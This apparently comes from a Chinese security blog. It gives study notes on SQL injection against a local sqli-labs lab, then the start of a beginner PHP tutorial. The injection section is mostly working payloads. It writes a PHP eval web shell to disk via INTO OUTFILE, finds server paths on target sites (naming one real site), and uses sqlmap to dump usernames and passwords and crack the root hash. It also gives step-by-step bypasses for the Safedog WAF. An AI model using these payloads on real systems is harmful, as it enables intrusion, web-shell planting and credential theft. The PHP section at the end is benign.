<p>secure_file_priv 是可以绕过的(通过mysql的日态文件来进行绕过，有一个前提，网站必须开启这个日态功能，如果没有开启，就不许有一个执行sql语句的地方)</p>
<h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><h5 id="sql-labs第七关-文件写入"><a href="#sql-labs第七关-文件写入" class="headerlink" title="sql labs第七关 文件写入"></a>sql labs第七关 文件写入</h5><h5 id="sql语句绕过分析"><a href="#sql语句绕过分析" class="headerlink" title="sql语句绕过分析"></a>sql语句绕过分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将引号里的id删除</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;( (&#39; $id &#39; ) )</span><br><span class="line"></span><br><span class="line">加上 &#39;))--+</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;( (&#39; &#39;))--+ &#39; ) )</span><br></pre></td></tr></table></figure>

<h5 id="在sqli-labs里面尝试写入"><a href="#在sqli-labs里面尝试写入" class="headerlink" title="在sqli labs里面尝试写入"></a>在sqli labs里面尝试写入</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;&#39;))union 1,2,3--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062306167.png" alt="1583998370760"></p>
<p>这里并没有响应，文件写入注入点，一定没有反应</p>
<p>文件写入语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,2,3</span><br></pre></td></tr></table></figure>

<p>在这个<strong>2</strong>中使用<strong>单引号</strong>写入你想写入的东西</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们直接使用一句话木马进行上传,这里最后是路径，路径必须存才否则报错，这里必须用双斜杠，因为单斜杠会被转义</span><br><span class="line">union select 1,&#39;&lt;?php eval($_POST[&quot;pass&quot;])?&gt;&#39;,3 into outfile &#39;D:\\1\\1.php&#39;</span><br></pre></td></tr></table></figure>

<h5 id="在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。"><a href="#在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。" class="headerlink" title="在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。"></a>在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。</h5><h5 id="1、通过错误爆出路径"><a href="#1、通过错误爆出路径" class="headerlink" title="1、通过错误爆出路径"></a>1、通过错误爆出路径</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这两个命令可以再百度查看一些错误网页信息</span><br><span class="line">inurl:php warning</span><br><span class="line">inurl:edu.cn warning</span><br></pre></td></tr></table></figure>

<p>网站                                                                        错误信息</p>
<p><a href="http://www.doushanedu.cn/" target="_blank" rel="noopener">www.doushanedu.cn/</a>             /www/wwwroot/zhanqun/data/function.php</p>
<h5 id="2、通过对方网站遗留文件爆出路径"><a href="#2、通过对方网站遗留文件爆出路径" class="headerlink" title="2、通过对方网站遗留文件爆出路径"></a>2、通过对方网站遗留文件爆出路径</h5><p>常见的遗留的phpinfor.php文件</p>
<h5 id="3、通过漏洞爆出路径"><a href="#3、通过漏洞爆出路径" class="headerlink" title="3、通过漏洞爆出路径"></a>3、通过漏洞爆出路径</h5><p>discuz爆出路径</p>
<h5 id="4、根据对方web服务器类型猜解路径"><a href="#4、根据对方web服务器类型猜解路径" class="headerlink" title="4、根据对方web服务器类型猜解路径"></a>4、根据对方web服务器类型猜解路径</h5><p>IIS:\inetpub\wwwroot\</p>
<p>PHPSTUDY2020:\phpstudy pro\www</p>
<p>PHPSTUDY2018:\phpStudy\PHPTutorial\WWW</p>
<p>只要爆出来路径，并且secure_file_priv为空，即可写入文件getshell</p>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><h5 id="爆出库名"><a href="#爆出库名" class="headerlink" title="爆出库名"></a>爆出库名</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062379253.png" alt="1584062306167"></p>
<h5 id="爆出想要查询数据库的表名，这里查询security"><a href="#爆出想要查询数据库的表名，这里查询security" class="headerlink" title="爆出想要查询数据库的表名，这里查询security"></a>爆出想要查询数据库的表名，这里查询security</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062748704.png" alt="1584062379253"></p>
<h5 id="爆出字段，这里查询users表"><a href="#爆出字段，这里查询users表" class="headerlink" title="爆出字段，这里查询users表"></a>爆出字段，这里查询users表</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users --columns</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062849649.png" alt="1584062638658"></p>
<h5 id="爆出数据，这里查询password，username，这里使用–dump-荡出整个数据库"><a href="#爆出数据，这里查询password，username，这里使用–dump-荡出整个数据库" class="headerlink" title="爆出数据，这里查询password，username，这里使用–dump 荡出整个数据库"></a>爆出数据，这里查询password，username，这里使用–dump 荡出整个数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062904145.png" alt="1584062748704"></p>
<h5 id="还可以使用sqlmap查看当前用户"><a href="#还可以使用sqlmap查看当前用户" class="headerlink" title="还可以使用sqlmap查看当前用户"></a>还可以使用sqlmap查看当前用户</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --users</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062987595.png" alt="1584062849649"></p>
<h5 id="如果用户为root用户可以查询数据库密码"><a href="#如果用户为root用户可以查询数据库密码" class="headerlink" title="如果用户为root用户可以查询数据库密码"></a>如果用户为root用户可以查询数据库密码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --password</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584068754403.png" alt="1584062904145"></p>
<h5 id="爆出以上加密密码，使用md5在线解密，查看密码"><a href="#爆出以上加密密码，使用md5在线解密，查看密码" class="headerlink" title="爆出以上加密密码，使用md5在线解密，查看密码"></a>爆出以上加密密码，使用md5在线解密，查看密码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">查看这个解密之后的值，可以看到，当前数据库密码为root</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069595543.png" alt="1584062987595"></p>
<h5 id="查看当前数据库"><a href="#查看当前数据库" class="headerlink" title="查看当前数据库"></a>查看当前数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583917392652.png" alt="1584063112661"></p>
<h4 id="注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”"><a href="#注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”" class="headerlink" title="注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”"></a>注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”</h4><h4 id="之前都是以GET请求注入，我们现在要以多种请求注入"><a href="#之前都是以GET请求注入，我们现在要以多种请求注入" class="headerlink" title="之前都是以GET请求注入，我们现在要以多种请求注入"></a>之前都是以GET请求注入，我们现在要以多种请求注入</h4><h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h5><h5 id="GET-最常见的请求方式"><a href="#GET-最常见的请求方式" class="headerlink" title="GET    最常见的请求方式"></a>GET    最常见的请求方式</h5><h5 id="POST-一般用于登录框"><a href="#POST-一般用于登录框" class="headerlink" title="POST     一般用于登录框"></a>POST     一般用于登录框</h5><h5 id="COOKIE-想用哪里用哪里"><a href="#COOKIE-想用哪里用哪里" class="headerlink" title="COOKIE    想用哪里用哪里"></a>COOKIE    想用哪里用哪里</h5><h4 id="POST请求注入"><a href="#POST请求注入" class="headerlink" title="POST请求注入"></a>POST请求注入</h4><p>确定字段数</p>
<h5 id="只需要在登录框提交sql注入语句"><a href="#只需要在登录框提交sql注入语句" class="headerlink" title="只需要在登录框提交sql注入语句"></a>只需要在登录框提交sql注入语句</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里测试了，他的字段数是2</span><br><span class="line">例如：</span><br><span class="line">-1&#39; order by 2</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584068845245.png" alt="1584068754403"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前数据库</span><br><span class="line">-1&#39; union select 1,database() #</span><br><span class="line"></span><br><span class="line">后面查询跟Union相同</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069834914.png" alt="1584068845245"></p>
<h4 id="COOKIE请求注入"><a href="#COOKIE请求注入" class="headerlink" title="COOKIE请求注入"></a>COOKIE请求注入</h4><h5 id="如果获取到cookie呢？"><a href="#如果获取到cookie呢？" class="headerlink" title="如果获取到cookie呢？"></a>如果获取到cookie呢？</h5><p>可以使用burp抓包，然后在cookie后写入sql注入语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里用-1&#39; order by 3 # 查看字段是是否是3，发现页面返回正常</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069642030.png" alt="1584069595543"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069770460.png" alt="1584069642030"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看-1&#39; order by 4 # 字段4是否是正常，页面返回错误，我们可以确定字段是3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584078476353.png" alt="1584069691296"></p>
<h5 id="查看当前库名"><a href="#查看当前库名" class="headerlink" title="查看当前库名"></a>查看当前库名</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select 1,2,database()# 查看当前库名，如果要查询表名和字段名数据，和union注入相同</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584183906874.png" alt="1584069834914"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584080162515.png" alt="1584069770460"></p>
<h4 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h4><p>如果user-Agent这里，如果添加一个sql查询，就可以通过user-Agent进行sql注入</p>
<h4 id="参数类型注入-三种"><a href="#参数类型注入-三种" class="headerlink" title="参数类型注入(三种)"></a>参数类型注入(三种)</h4><h5 id="1、数字型"><a href="#1、数字型" class="headerlink" title="1、数字型"></a>1、数字型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语句：select * from mars where id&#x3D;1</span><br><span class="line"></span><br><span class="line">连接后就构造成了sql语句的查询</span><br><span class="line">连接：select * from mars where id&#x3D;-1 union select 1,database(),user()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ID：-1 union select 1,database(),user()</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069691296.png" alt="1584078476353"></p>
<h5 id="2、字符型"><a href="#2、字符型" class="headerlink" title="2、字符型"></a>2、字符型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语句：select * from mars where id&#x3D;&#39;mars&#39;</span><br><span class="line"></span><br><span class="line">连接：select * from mars where id&#x3D;&#39;-1’ union select 1,database(),user()--+&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ID：-1’ union select 1,database(),user()--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584184821104.png" alt="1584078842647"></p>
<h5 id="3、搜索型"><a href="#3、搜索型" class="headerlink" title="3、搜索型"></a>3、搜索型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语句：select * from mars where mars like id&#x3D;&#39;%a%&#39;</span><br><span class="line"></span><br><span class="line">%&#39;闭合前面，后面虽然也可以用注释符注释掉但不推荐 还是用&#39;%来将其闭合，中间剩下的就是sql注入语句</span><br><span class="line">连接：select * from mars where mars like id&#x3D;&#39;%%&#39; union select 1,database(),user()&#39;%%&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ID：%&#39; union select 1,database(),user()&#39;%</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584078842647.png" alt="1584080162515"></p>
<h3 id="绕过过滤注释符号的注入"><a href="#绕过过滤注释符号的注入" class="headerlink" title="绕过过滤注释符号的注入"></a>绕过过滤注释符号的注入</h3><p>如果过滤注释符号</p>
<p>使用preg_replace函数 </p>
<p>注释注入在这里就不工作了，怎么办呢？</p>
<p>注入，不一定使用注释，也可以使用闭合</p>
<p>闭合不好之处就是，执行点少</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里使用--+还是返回正确页面，因为网页将注释符给过滤掉了</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584185554495.png" alt="1584183906874"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用union select强制闭合</span><br><span class="line">$sql &#x3D; select * from users where id&#x3D;&#39;$id&#39;</span><br><span class="line">payload:-1&#39; union select 1,2,&#39;3</span><br><span class="line"></span><br><span class="line">我们来进行一个带入</span><br><span class="line">可以看到，带入之后-1被闭合了，3被闭合了，所以我们只有在2的位置进行一个sql语句</span><br><span class="line">执行点只有2，因为1被省略了网站不显示，3被闭合了不能使用</span><br><span class="line">$sql &#x3D; select * from users where id&#x3D;&#39;-1&#39; union select 1,2,&#39;3&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584185630448.png" alt="1584184821104"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">还有一种就是 or 闭合</span><br><span class="line">select * from users where id&#x3D;&#39;$id&#39;</span><br><span class="line">plyload:-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">这里还是 -1闭合了，or后面的全部闭合了，执行中间的一部分，</span><br><span class="line">带入：select * from users where id&#x3D;&#39;-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584063112661.png" alt="1584185554495"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">虽然执行中间一部分就是union select 1,2,3，但是可控点还是只有2，只能在2的位置进行查询</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584186947810.png" alt="1584185630448"></p>
<h4 id="扩展思考"><a href="#扩展思考" class="headerlink" title="扩展思考"></a>扩展思考</h4><p>搜索性注入</p>
<p>select * from users where username like ‘%mysql%’</p>
<p>两种方法</p>
<p>第一种：注释</p>
<p>%’ union select 1,2,3 –+</p>
<p>第二种：闭合</p>
<p>%’ union select 1,2,3 ‘%</p>
<h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><h5 id="安全狗-waf-，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果"><a href="#安全狗-waf-，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果" class="headerlink" title="安全狗(waf)，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果"></a>安全狗(waf)，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果</h5><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><a href="http://free.safedog.cn/website_safedog.html" target="_blank" rel="noopener">http://free.safedog.cn/website_safedog.html</a></p>
<p>注意：一定要改成系统服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们可以看到正常输入网址已经被拦截了，我们可以输出union select 发现页面还是显示防火墙，然后将a加入到union和select发现出错了，表示防火墙拦截的不是union也不是select而是拦截的 union select他们的一个整体</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584187385821.png" alt="1584186947810"></p>
<p>首先要判断安全狗识别的是哪一个关键字，怎么判断，在前面加上，干扰字符，比如a</p>
<p>判断安全狗拦截的union select 而并非union和select</p>
<p>我们看到aselect不会被拦截如何让aselect不执行给安全狗看</p>
<p>/* ! */符号是mysql一个特性就是，安全狗他在士必得时候会认为这是一个注释，不会对系统造成畏寒，所以，安全狗就不去拦截。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*select*&#x2F;1,2,3</span><br><span class="line">我们发现使用注释之后安全狗还进行拦截，怎么办呢</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584187649190.png" alt="1584187385821"></p>
<p>让aselect中a执行给安全狗看，实际执行的是select</p>
<p>%0a    换行</p>
<p>%23    注释</p>
<p>让a单独在一行，然后把这个a注释掉，select是不是就正常执行了，安全狗这边会认为是一个正常的注释，不会拦截</p>
<p>payload：-1 union %23a%0a//select/1,2,3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,2,3</span><br><span class="line">这里我们发现了我们成功地绕过了安全狗的拦截</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584187950038.png" alt="1584187649190"></p>
<p>如果我们要查询数据库，还是按照之前的直接在2的位置打上database()是会被安全狗拦截的，所以我们判断安全狗拦截的是那一块内容，我们尝试在database(a)的括号里面加上一个a试试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,database(a),3</span><br><span class="line">发现报错了，表示括号里的a没有被拦截，我们就可以判断安全狗拦截的是database而不是括号</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584188802374.png" alt="1584187950038"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">所以我将其database和()括号分开</span><br><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,&#x2F;*!database*&#x2F;&#x2F;*!()*&#x2F;,3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584188366327.png" alt="1584188050784"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们发现还拦截，所以我们就可以按照之前换行，注释a换行database的方法来将database显示出来</span><br><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,%23a%0a&#x2F;*!database*&#x2F;&#x2F;*!()*&#x2F;,3</span><br><span class="line">我们发现成功地返回了我们的库名，也就说明了安全狗没有去拦截这样的一个函数</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584188050784.png" alt="1584188366327"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name from information_schema.schemata,3</span><br><span class="line">我们可以在每个函数里面都放一个a查看哪一个函数被拦截，之后经过测试from被拦截了，其他都没有被拦截然后我们可以将from进行a注释换行</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584189188995.png" alt="1584188802374"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先尝试&#x2F;*!from*&#x2F;如果被拦截还是用%23a%0a&#x2F;*!from*&#x2F;</span><br><span class="line"></span><br><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name %23a%0a&#x2F;*!from*&#x2F; information_schema.schemata,3</span><br><span class="line">我们发现成功地将内容显示出来了</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584189398751.png" alt="1584189188995"></p>
<p>获取一下表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name %23a%0a&#x2F;*!from*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;,3</span><br><span class="line">直接返回成功，where并没有被拦截</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584189864602.png" alt="1584189398751"></p>
<p>安全狗防御防御效果很low。实际情况下，安全狗用的是最多的，但是，也是最好过的</p>
<p>安全狗，aliyundun，很好过，但是Godaddy很难过</p>
<p>mysql版本判断特性</p>
<p>/* 44509select */在mysql中不会进行报错的，这个44509是mysql的一个正常的判断，当mysql的版本大于44509就会执行select语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*44509select*&#x2F; 1,2,3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200403142025653.png" alt="image-20200403142025653"></p>
]]></content>
  </entry>
  <entry>
    <title>php</title>
    <url>/2020/04/03/php/</url>
    <content><![CDATA[<h4 id="什么是PHP"><a href="#什么是PHP" class="headerlink" title="什么是PHP"></a>什么是PHP</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	超文本预处理器</span><br><span class="line">运行原理</span><br><span class="line">		运行在服务器端的，内嵌在html中的脚本语言</span><br><span class="line">		集成环境有哪些</span><br><span class="line">					wampserver  xmapp  phpstudy  appserver</span><br><span class="line">					php引擎(7.0)  mysql(数据库 database)  apache(服务)</span><br><span class="line">		为什么学习的时候用集成环境</span><br><span class="line">			学习入门</span><br><span class="line">访问：</span><br><span class="line">	localhost  本机服务器名字&#x2F;php文件</span><br><span class="line">	127.0.0.1  你本机的ip地址&#x2F;php文件</span><br><span class="line">注意：</span><br><span class="line">	在写php代码的时候统统写在www目录下</span><br><span class="line">【开发工具】</span><br><span class="line">vim  subline 【notepad++】 phpstrom webstrom dw NetBeans</span><br><span class="line">【php信息】 </span><br><span class="line">	phpinfo();显示所有的php信息</span><br><span class="line">	他是模块化的，你需要什么，你必须给我开启那个模块</span><br><span class="line">	php.ini</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582175685530.png" alt="1582175685530"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php</span><br><span class="line">同样效果</span><br><span class="line">访问某个文件夹 默认会去访问这个文件夹下面的index.php 或者也会访问 index.html</span><br><span class="line">		文件夹下既有index.php也有index.html在我们的环境变量里，默认会去访问index.php</span><br><span class="line">		如果都没有，会将目录下的文件或文件夹列举出来</span><br><span class="line"></span><br><span class="line">文件或者目录只有放在www目录下面的文件才会被我们能访问的到</span><br><span class="line">我们写的PHP代码，放在根目录下面的文件夹胡总和文件里面，后对名是.php</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582356332678.png" alt="1582178905188"></p>
<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><h5 id="一、初识PHP脚本程序"><a href="#一、初识PHP脚本程序" class="headerlink" title="一、初识PHP脚本程序"></a>一、初识PHP脚本程序</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、php开始标记&lt;?php</span><br><span class="line">	结束标记?&gt;</span><br><span class="line"></span><br><span class="line">	&lt;?php </span><br><span class="line">		语句....</span><br><span class="line">	?&gt;</span><br><span class="line"></span><br><span class="line">    1) &lt;?php ?&gt;这之间就表示进入了PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略</span><br><span class="line">    2) 可以直接嵌入到html代码中，并且 </span><br><span class="line">            可以嵌入到html代码中的任何地方，在html文档中可以嵌入任意多个PHP标记！</span><br><span class="line">    3) 文件末尾的PHP代码段结束标记可以不要，在一些情况下省略掉更好！</span><br><span class="line"></span><br><span class="line">2、指令分隔符 &quot;;&quot; 分号</span><br><span class="line">	1)PHP语句分为两种，一种是在程序中使用结构定义语句，另一种是在程序中使用功能执行语句，前			者结尾不需要使用分号，后者必须使用分号结尾！</span><br><span class="line">	2)文件末尾的结束标志 ?&gt; 就隐含了一个分号，所以PHP代码最后一行可以不加分号</span><br><span class="line">	</span><br><span class="line">3、注释</span><br><span class="line">	&#x2F;*多行注释*&#x2F;</span><br><span class="line">	&#x2F;&#x2F;单行注释</span><br><span class="line">4、遇到空白的处理</span><br><span class="line">	空格、缩进、换行这些在PHP都是无关紧要的(注意：是要在英文输入法下输入)，可以将一个语句展			开成任意行，或者紧缩在一行，使用空格和空行可以增强代码的可读性，但是要合理运用，不			然会产生阅读负担</span><br></pre></td></tr></table></figure>

<h4 id="二、变量"><a href="#二、变量" class="headerlink" title="二、变量"></a>二、变量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">概述：</span><br><span class="line">	临时(只有在我们的程序的运行过程中才存在)用于存储数据的容器</span><br><span class="line">1、变量的声明</span><br><span class="line">	声明：说白了就是事先通知！</span><br><span class="line">	在使用变量之前要事先通知，事先声明一下！</span><br><span class="line">	注意：在PHP中，使用变量的时候不需要声明</span><br><span class="line">	在PHP中变脸必须使用一个美元符号$ 后面跟着变量名来表示，赋值使用&#x3D;给一个变量赋值</span><br><span class="line">	例如：	$变量名&#x3D;数值;</span><br><span class="line">2、变量的销毁</span><br><span class="line">	unset() &#x2F;&#x2F; 使用语法：unset($变量名)</span><br><span class="line">	&lt;?php</span><br><span class="line">        $handsome &#x3D; 25;</span><br><span class="line">        unset($handsome);</span><br><span class="line">        echo $handsome;</span><br><span class="line">     ?&gt;</span><br><span class="line">3、变量的命名</span><br><span class="line">	1) 严格区分大小写</span><br><span class="line">	2) 变量名称可以是字母、数字、下划线，但不能以数字开头</span><br><span class="line">4、PHP中有一些关键字，其他编程语言中不能使用他们中的任何一个做为常量、函数名或类名。</span><br><span class="line">	但是可以在PHP中做为变量名称使用，不推荐使用关键字，</span><br><span class="line">5、可变变量(了解)</span><br><span class="line">	可变变量就是不是固定的数据，可以随时改变的</span><br><span class="line">	$result &#x3D; &quot;handsome&quot;;</span><br><span class="line">    $$result &#x3D; &quot;英俊&quot;;</span><br><span class="line">    echo $handsome;</span><br><span class="line"></span><br><span class="line">6、引用赋值</span><br><span class="line">	引用赋值大白话讲就是给变量起别名</span><br><span class="line">	$a &#x3D; 10;</span><br><span class="line">	&#x2F;&#x2F; $b &#x3D; $a;		&#x2F;&#x2F; 这种操作修改$b并不会影响另外一个值</span><br><span class="line">    $b &#x3D; &amp;$a;		&#x2F;&#x2F; 修改任意一方都会影响</span><br><span class="line">    $b &#x3D; 20;</span><br><span class="line">    echo $a;</span><br><span class="line">&#x2F;&#x2F; 应该可以理解为，没起别名之前$a和$b是单独的，起完别名之后$b&#x3D;&amp;$b这样他们两个就变成了要给整体</span><br><span class="line">	修改任意一方就会改变。</span><br></pre></td></tr></table></figure>

